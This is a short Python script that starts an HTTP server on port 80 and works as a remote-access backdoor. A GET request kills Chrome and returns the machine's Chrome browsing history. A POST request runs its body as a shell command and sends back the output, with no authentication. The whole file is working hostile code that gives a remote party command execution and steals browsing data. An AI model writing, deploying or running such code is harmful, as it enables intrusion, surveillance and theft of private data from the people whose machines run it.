from http.server import BaseHTTPRequestHandler, HTTPServer
import logging
import subprocess
import browserhistory as bh
import json
MAX_RESULTS = 1
class S(BaseHTTPRequestHandler):

    def _set_response(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        logging.info("GET request,\nPath: %s\nHeaders:\n%s\n", str(self.path), str(self.headers))
        self._set_response()
        subprocess.run('taskkill /F /IM chrome.exe /T',shell=True)
        test_dict = bh.get_browserhistory()
        #test_dict = dict(list(test_dict.items())[:MAX_RESULTS])
        test_dict = test_dict['chrome'][0:4][1:3]
        res_bytes = json.dumps(test_dict).encode('utf-8')
        self.wfile.write(res_bytes) 

    def do_POST(self):
        content_length = int(self.headers['Content-Length']) # <--- Gets the size of data
        post_data = self.rfile.read(content_length) # <--- Gets the data itself
        k = subprocess.check_output( str(post_data.decode('utf-8')),shell=True )    
        logging.info("POST request,\nPath: %s\nHeaders:\n%s\n\nBody:\n%s\n",
                str(self.path), str(self.headers), post_data.decode('utf-8'))
        
            
        self._set_response()
        self.wfile.write(str(k).format(self.path).encode('utf-8'))

def run(server_class=HTTPServer, handler_class=S, port=80):
    logging.basicConfig(level=logging.INFO)
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    logging.info('Starting httpd...\n')
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()
    logging.info('Stopping httpd...\n')

if __name__ == '__main__':
    from sys import argv

    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
